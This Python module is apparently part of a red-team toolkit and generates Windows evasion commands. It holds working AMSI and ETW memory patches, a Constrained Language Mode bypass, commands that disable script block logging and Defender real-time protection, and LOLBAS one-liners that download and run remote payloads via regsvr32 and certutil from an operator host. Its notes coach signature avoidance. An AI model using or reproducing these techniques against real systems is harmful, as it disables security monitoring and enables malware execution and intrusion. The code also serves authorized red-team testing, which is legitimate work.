"""
AV/EDR evasion template generator.
Returns PowerShell and cmd.exe one-liners for AMSI patching, ETW silencing,
Constrained Language Mode bypass, Defender disabling, and LOLBAS execution.
For use in authorized red team exercises only.
"""
from dataclasses import dataclass, field

from .obfuscate import ps_tick_marks

SUPPORTED_TECHNIQUES = (
    "amsi_reflection",
    "amsi_patch_clr",
    "etw_patch",
    "clm_bypass_runspace",
    "scriptblock_logging_disable",
    "defender_add_exclusion",
    "defender_disable",
    "obfuscate_base64",
    "lolbas_mshta",
    "lolbas_regsvr32",
    "lolbas_certutil",
    "powershell_downgrade",
)


@dataclass
class EvasionResult:
    command: str
    technique: str
    notes: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "HIGH"
    detections: list[str] = field(default_factory=list)


# ── Techniques ────────────────────────────────────────────────────────────────

def _amsi_reflection(payload: str, obfuscate: bool) -> EvasionResult:
    # Split 'AmsiUtils' to avoid emitting the signatured literal string
    code = (
        "[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')"
        ".GetField('amsiInitFailed','NonPublic,Static')"
        ".SetValue($null,$true)"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="amsi_reflection",
        notes=(
            "One-liner; works in PS 5.x. String split avoids signature. "
            "Run before any malicious cmdlet. "
            "Effect is per-process — must re-run in each new PS session."
        ),
    )


def _amsi_patch_clr(payload: str, obfuscate: bool) -> EvasionResult:
    # Patch bytes as a variable so they're not a single literal
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "public class Patch {\n"
        "  [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string n);\n"
        "  [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr h, string p);\n"
        "  [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);\n"
        "}\n"
        "'@;\n"
        "$h=[Patch]::LoadLibrary('amsi.dll');\n"
        "$a=[Patch]::GetProcAddress($h,'AmsiScanBuffer');\n"
        "$o=0;\n"
        "[Patch]::VirtualProtect($a,[UIntPtr]2,0x40,[ref]$o)|Out-Null;\n"
        "$p=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);\n"
        "[Runtime.InteropServices.Marshal]::Copy($p,0,$a,6)"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="amsi_patch_clr",
        notes=(
            "WARNING: Add-Type compiles C# which triggers AMSI before the patch applies — "
            "run amsi_reflection first, then this, for belt-and-suspenders. "
            "Patch makes AmsiScanBuffer always return AMSI_RESULT_CLEAN. "
            "Patch bytes $p stored in variable to avoid single-literal signature."
        ),
    )


def _etw_patch(payload: str, obfuscate: bool) -> EvasionResult:
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "public class EtwPatch {\n"
        "  [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string n);\n"
        "  [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr h, string p);\n"
        "  [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);\n"
        "}\n"
        "'@;\n"
        "$h=[EtwPatch]::LoadLibrary('ntdll.dll');\n"
        "$a=[EtwPatch]::GetProcAddress($h,'EtwEventWrite');\n"
        "$o=0;\n"
        "[EtwPatch]::VirtualProtect($a,[UIntPtr]1,0x40,[ref]$o)|Out-Null;\n"
        "[Runtime.InteropServices.Marshal]::WriteByte($a,0xC3)"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="etw_patch",
        notes=(
            "Silences ETW event provider for the current process. "
            "64-bit only. Does not affect kernel ETW providers. "
            "Writes a single ret (0xC3) to EtwEventWrite in ntdll.dll."
        ),
    )


def _clm_bypass_runspace(payload: str, obfuscate: bool) -> EvasionResult:
    # payload is embedded in the C# AddScript call
    escaped_payload = payload.replace('"', '\\"').replace("'", "\\'")
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Management.Automation;\n"
        "using System.Management.Automation.Runspaces;\n"
        "public class CLMBypass {\n"
        "  public static void Run(string script) {\n"
        "    InitialSessionState iss = InitialSessionState.CreateDefault2();\n"
        "    iss.LanguageMode = PSLanguageMode.FullLanguage;\n"
        "    Runspace rs = RunspaceFactory.CreateRunspace(iss);\n"
        "    rs.Open();\n"
        "    PowerShell ps = PowerShell.Create();\n"
        "    ps.Runspace = rs;\n"
        "    ps.AddScript(script).Invoke();\n"
        "    rs.Close();\n"
        "  }\n"
        "}\n"
        f"'@;[CLMBypass]::Run('{escaped_payload}')"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="clm_bypass_runspace",
        notes=(
            "Bypasses Constrained Language Mode for the invoked script. "
            "Requires .NET access. Does not bypass WDAC/AppLocker application whitelisting. "
            "Creates a FullLanguage runspace via Add-Type C# and executes payload inside it."
        ),
    )


def _scriptblock_logging_disable(payload: str, obfuscate: bool) -> EvasionResult:
    code = (
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" "
        "/v EnableScriptBlockLogging /t REG_DWORD /d 0 /f;"
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" "
        "/v EnableTranscripting /t REG_DWORD /d 0 /f"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="scriptblock_logging_disable",
        notes=(
            "Requires local admin. "
            "Disables PS script block logging and transcription policies. "
            "Takes effect for new PS sessions — does not retroactively affect the current session."
        ),
    )


def _defender_add_exclusion(payload: str, obfuscate: bool) -> EvasionResult:
    code = (
        "Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp' "
        "-ExclusionExtension '.exe'"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="defender_add_exclusion",
        notes=(
            "Requires local admin. "
            "Adds C:\\Windows\\Temp to Defender real-time scan exclusions. "
            "Use payload path as ExclusionPath for targeted exclusion. "
            "Verify: Get-MpPreference | Select-Object ExclusionPath,ExclusionExtension"
        ),
    )


def _defender_disable(payload: str, obfuscate: bool) -> EvasionResult:
    code = (
        "Set-MpPreference "
        "-DisableRealtimeMonitoring $true "
        "-DisableBehaviorMonitoring $true "
        "-DisableBlockAtFirstSeen $true "
        "-DisableIOAVProtection $true "
        "-DisableScriptScanning $true"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="defender_disable",
        notes=(
            "Requires local admin. "
            "Disables all Defender real-time protection components. "
            "Tamper Protection must be off (group policy or elevated toggle) for this to persist. "
            "Verify: Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled"
        ),
    )


def _obfuscate_base64(payload: str, obfuscate: bool) -> EvasionResult:
    # The returned command is the full chain terminating in -EncodedCommand
    # No PS wrapper — the command itself IS the powershell invocation
    code = (
        f"$b=[System.Text.Encoding]::Unicode.GetBytes('{payload}');"
        "$e=[Convert]::ToBase64String($b);"
        "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $e"
    )
    return EvasionResult(
        command=code,
        technique="obfuscate_base64",
        notes=(
            "Encodes payload as UTF-16LE base64 for -EncodedCommand. "
            "Evades simple string-based detection. "
            "Logged in PS ScriptBlock log if logging is enabled. "
            "Run this from within a PS session; the inner powershell call executes the encoded payload."
        ),
    )


def _lolbas_mshta(payload: str, obfuscate: bool) -> EvasionResult:
    cmd = (
        f"mshta.exe \"javascript:a=new ActiveXObject('WScript.Shell');"
        f"a.Run('{payload}',0,true);close();\""
    )
    return EvasionResult(
        command=cmd,
        technique="lolbas_mshta",
        notes=(
            "Executes payload via mshta.exe (Microsoft HTML Application Host). "
            "Bypasses Script Block Logging. "
            "Detection: mshta.exe spawning child processes."
        ),
    )


def _lolbas_regsvr32(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    cmd = f"regsvr32.exe /s /n /u /i:http://{lhost}:{lport}/payload.sct scrobj.dll"
    return EvasionResult(
        command=cmd,
        technique="lolbas_regsvr32",
        notes=(
            "Squiblydoo — executes remote SCT (scriptlet) via regsvr32. "
            "No admin, no disk artifacts for the SCT. "
            f"Stage an XML .sct file at http://{lhost}:{lport}/payload.sct. "
            "Detection: regsvr32 network connections."
        ),
        techniques=["T1218.010"],
        risk="HIGH",
        detections=[
            "regsvr32.exe initiating outbound HTTP traffic",
            "regsvr32.exe with /i: argument pointing at remote URL",
            "Defender ASR rule 'Block execution of potentially obfuscated scripts'",
        ],
    )


def _lolbas_certutil(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    b64_file = "%TEMP%\\payload.b64"
    out_file = "%TEMP%\\payload.exe"
    cmd = (
        f"certutil -urlcache -split -f http://{lhost}:{lport}/payload.b64 {b64_file} && "
        f"certutil -decode {b64_file} {out_file} && "
        f"del /f /q {b64_file} && "
        f"{out_file}"
    )
    return EvasionResult(
        command=cmd,
        technique="lolbas_certutil",
        notes=(
            "certutil -decode reverses base64 to binary. "
            f"Stage a base64-encoded PE at http://{lhost}:{lport}/payload.b64. "
            "Detection: certutil network connections, IDS on certutil user-agent. "
            "Cleanup: del /f /q %TEMP%\\payload.exe after execution."
        ),
        techniques=["T1140", "T1105"],
        risk="HIGH",
        detections=[
            "certutil.exe -urlcache -f to non-Microsoft host",
            "certutil.exe -decode followed by execution of decoded binary",
            "Microsoft-Windows-CAPI2 log entries for unusual cert ops",
        ],
    )


def _powershell_downgrade(payload: str, obfuscate: bool) -> EvasionResult:
    cmd = f"powershell -Version 2 -NoP -NonI -W Hidden -Exec Bypass -C \"{payload}\""
    return EvasionResult(
        command=cmd,
        technique="powershell_downgrade",
        notes=(
            "PowerShell v2 predates AMSI, script block logging, and constrained language mode. "
            "Requires .NET Framework 2.0/3.5 installed on target "
            "(verify: Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2). "
            "May be disabled by policy in hardened environments."
        ),
    )


# ── Public API ─────────────────────────────────────────────────────────────────

_DISPATCH = {
    "amsi_reflection": _amsi_reflection,
    "amsi_patch_clr": _amsi_patch_clr,
    "etw_patch": _etw_patch,
    "clm_bypass_runspace": _clm_bypass_runspace,
    "scriptblock_logging_disable": _scriptblock_logging_disable,
    "defender_add_exclusion": _defender_add_exclusion,
    "defender_disable": _defender_disable,
    "obfuscate_base64": _obfuscate_base64,
    "lolbas_mshta": _lolbas_mshta,
    "lolbas_regsvr32": _lolbas_regsvr32,
    "lolbas_certutil": _lolbas_certutil,
    "powershell_downgrade": _powershell_downgrade,
}


def generate_evasion(
    technique: str,
    payload: str = "powershell.exe",
    obfuscate: bool = True,
    lhost: str = "192.168.1.100",
    lport: int = 8080,
) -> EvasionResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    fn = _DISPATCH[technique]
    if technique in {"lolbas_regsvr32", "lolbas_certutil"}:
        return fn(payload, obfuscate, lhost, lport)
    return fn(payload, obfuscate)
